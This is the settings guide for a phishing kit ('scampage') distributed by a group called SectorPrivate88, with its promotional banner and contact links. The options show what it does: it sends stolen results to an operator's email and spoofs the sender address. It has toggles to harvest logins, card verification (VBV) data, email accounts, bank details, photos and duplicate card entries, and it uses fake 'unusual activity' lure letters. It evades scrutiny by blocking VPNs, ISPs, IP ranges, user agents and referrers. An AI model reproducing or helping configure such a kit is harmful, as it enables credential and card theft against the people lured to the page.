
/*
____            _             ____       _            _           ___   ___  
/ ___|  ___  ___| |_ ___  _ __|  _ \ _ __(_)_   ____ _| |_ ___    ( _ ) ( _ ) 
\___ \ / _ \/ __| __/ _ \| '__| |_) | '__| \ \ / / _` | __/ _ \   / _ \ / _ \ 
 ___) |  __/ (__| || (_) | |  |  __/| |  | |\ V / (_| | ||  __/  | (_) | (_) |
|____/ \___|\___|\__\___/|_|  |_|   |_|  |_| \_/ \__,_|\__\___|___\___/ \___/ 
                                                             |_____|          

Join our community
Facebook Groups : https://www.facebook.com/groups/621105481775437/
Telegram Chanel : https://t.me/sectorprivate88
Need our help : sectorprivate88 [at] gmail.com

if link die you can find at (https://pastebin.com/2bwFRSjP) for updated link

*/

This is how to set custom setting,use your brain.



email_result = (set your email result)
lock_platform = (on|off)
sender_mail = (change sender to current host, ex : sender@myscampage.com)
site_parameter = (sectorprivate88) will result yourdomain.com/?sectorprivate88
site_password = "sectorprivate88"
site_param_on = (on|off)
site_pass_on = (on|off)
send_login = (on|off)
get_photo = (on|off)
get_vbv = (on|off)
get_email = (on|off)
get_bank = (on|off)
onetime = (on|off)
block_host = (on|off)
block_ua = (on|off)
block_iprange = (on|off)
block_isp = (on|off)
block_vpn = (on|off)
letter = (unusual_activity|limited)
double_cc = (on|off)
block_referrer = (on|off)